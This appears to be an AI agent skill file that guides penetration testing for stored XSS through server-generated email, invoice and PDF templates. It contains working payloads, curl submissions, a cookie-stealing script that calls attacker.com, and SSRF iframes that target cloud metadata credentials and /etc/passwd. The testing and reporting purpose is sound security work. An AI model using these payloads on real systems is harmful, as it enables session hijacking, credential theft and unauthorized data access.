---
name: server-email-template-xss
description: Use when the backend generates HTML emails, PDFs, or documents by interpolating user-controlled fields without escaping. Common in support ticket flows, invoice generators, notification emails, and report builders. The XSS travels via the generated document, not the app's own WebView. Triggers - "email template", "support ticket", "notification email", "HTML email", "PDF generation", "invoice template", "interpolation XSS", "server-side template", "email body injection"
platform: [android, ios]
stack: [any]
category: injection
tier: B
related: [llm-prompt-injection-multiframe]
---

# Stored XSS via Server-Side Email/Document Template Interpolation

## When to use

- The mobile app has a feature that generates server-side HTML content from user input: support tickets, contact forms, feedback, invoice generation, notification emails, PDF reports
- User-controlled fields (name, description, subject, comments) are interpolated into an HTML template on the backend
- The generated HTML is delivered via email, rendered in a WebView, or exported as PDF
- The backend code uses string interpolation or template literals without HTML escaping

## Why this is different from WebView XSS

Traditional mobile XSS skills focus on the app's own WebView (loaded via `loadUrl`, `loadData`, etc.). This skill targets a different delivery channel:

1. User submits text via the mobile app (support form, feedback, profile update)
2. The backend interpolates this text into an HTML template (email, PDF, report)
3. The generated HTML is sent to a VICTIM (support agent, admin, other user) via email or rendered in their browser/email client
4. The victim's email client or browser executes the injected script/HTML

The attack surface is the backend template engine, not the mobile app's WebView.

## Step 1: Identify template interpolation points

Look for app features where user text ends up in server-generated HTML:

| Feature | User input | Generated output |
|---|---|---|
| Support/contact form | Subject, description, name | HTML email to support team |
| User profile | Display name, bio, company | Profile page, notification emails |
| Invoice/receipt | Item description, notes | PDF or HTML invoice |
| Feedback/review | Comment text, rating text | Admin dashboard, notification email |
| Report generation | Custom fields, annotations | PDF/HTML report |

### Static analysis (if source available)

```bash
# Look for template interpolation without escaping
rg -n "interpolat\|template\|sendMail\|htmlBody\|emailBody\|renderTemplate" /tmp/re_<app>/source/ --include="*.ts" --include="*.js" --include="*.py" --include="*.java" -l

# Look for string interpolation in email services
rg -B2 -A5 "\`.*\$\{.*\}\`\|\.format\(.*\)\|%s.*%.*\|f\".*{.*}\"" /tmp/re_<app>/source/ --include="*.ts" --include="*.js" --include="*.py" | grep -i "email\|mail\|html\|body\|template\|subject"

# Node.js/TypeScript pattern: template literals in email service
rg -A10 "sendMail\|transporter\.send\|nodemailer\|emailService" /tmp/re_<app>/source/ --include="*.ts" --include="*.js"
```

The vulnerable pattern looks like:

```typescript
// VULNERABLE: direct interpolation without escaping
const htmlBody = `
  <h2>Support Ticket</h2>
  <p><strong>From:</strong> ${user.name}</p>
  <p><strong>Description:</strong> ${ticket.description}</p>
`;
await transporter.sendMail({ to: "<email>", html: htmlBody });
```

The safe pattern:

```typescript
// SAFE: HTML-escaped before interpolation
const htmlBody = `
  <p><strong>Description:</strong> ${escapeHtml(ticket.description)}</p>
`;
```

### Dynamic analysis (no source)

Submit payloads through every user-input field and check if they appear unescaped in the output:

```
# Test payload for email/HTML context
<img src=x onerror=alert(1)>

# Test payload for attribute context
" onmouseover="alert(1)

# Canary to detect interpolation (no XSS, just detection)
CANARY_{{7*7}}_CANARY
```

## Step 2: Deliver the payload

### Via support/contact form

```bash
# Submit a support ticket with XSS in the description
curl -X POST "$API_URL/api/support/ticket" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "subject": "Need help with my account",
    "description": "<img src=x onerror=alert(document.domain)>Please help me with this issue."
  }'
```

### Via profile update

```bash
# Update display name with XSS
curl -X PUT "$API_URL/api/profile" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "displayName": "John<script>fetch(\"https://attacker.com/steal?c=\"+document.cookie)</script>"
  }'
```

### Via feedback/review

```bash
curl -X POST "$API_URL/api/feedback" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "rating": 5,
    "comment": "Great app!<img src=x onerror=alert(document.domain)>"
  }'
```

## Step 3: Verify execution

### Email delivery

If you control the recipient email (or can use a test account):
1. Check the raw HTML source of the received email
2. Look for unescaped HTML tags in the body
3. Note: most modern email clients (Gmail, Outlook) strip `<script>` tags but may render `<img onerror>`, CSS injection, or form elements

### Evidence collection

```bash
# If testing with a webhook/collaborator
# Use Burp Collaborator or a simple webhook to confirm execution
curl -X POST "$API_URL/api/support/ticket" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "description": "<img src=https://COLLABORATOR_URL/xss-proof>"
  }'
# Check collaborator for incoming HTTP request = HTML rendered without escaping
```

## Step 4: Assess impact

The severity depends on where the generated HTML is rendered:

| Rendering context | Impact | CVSS range |
|---|---|---|
| HTML email to internal staff | Session hijack of support agent, phishing | Medium-High (5.4-7.1) |
| Admin dashboard (browser) | Full XSS in admin context, potential admin takeover | High (7.1-8.8) |
| PDF report (wkhtmltopdf, puppeteer) | SSRF via PDF renderer, local file read | Medium-Critical (5.4-9.1) |
| HTML email to other users | Cross-user phishing, credential theft | Medium (4.3-5.4) |
| Notification rendered in app WebView | Standard stored XSS in app context | Medium (5.4) |

### PDF renderer escalation

If the backend uses a headless browser (puppeteer, wkhtmltopdf) to generate PDFs from the HTML:

```html
<!-- SSRF via PDF renderer -->
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>

<!-- Local file read via PDF renderer -->
<iframe src="file:///etc/passwd" width="800" height="600"></iframe>

<!-- JavaScript execution in PDF context -->
<script>
  fetch('http://169.254.169.254/latest/meta-data/')
    .then(r => r.text())
    .then(t => { document.body.innerText = t; });
</script>
```

## Step 5: Report with context

Document:
- The specific input field and API endpoint
- The template code (if source available) showing the interpolation without escaping
- The delivery channel (email, PDF, dashboard)
- Evidence of unescaped HTML in the output (raw email source, PDF content, screenshot)
- CVSS score adjusted for the rendering context

## Expected output

- Proof that user-controlled text appears unescaped in generated HTML
- Collaborator/webhook hit proving HTML rendering
- Raw email source or PDF showing injected content
- CVSS assessment based on rendering context and victim profile

## Limitations

- Most modern email clients strip dangerous HTML (scripts, event handlers). Impact in email context may be limited to HTML injection (phishing, defacement) rather than full XSS
- PDF renderers vary widely in what HTML/JS they execute. Test with the specific renderer the backend uses
- Some backends use templating engines (Handlebars, Jinja2, EJS) that auto-escape by default. The vuln requires explicit use of unescaped interpolation (`{{{ }}}` in Handlebars, `| safe` in Jinja2, `<%- %>` in EJS)
- Rate limiting on support/feedback endpoints may slow testing. Space submissions.
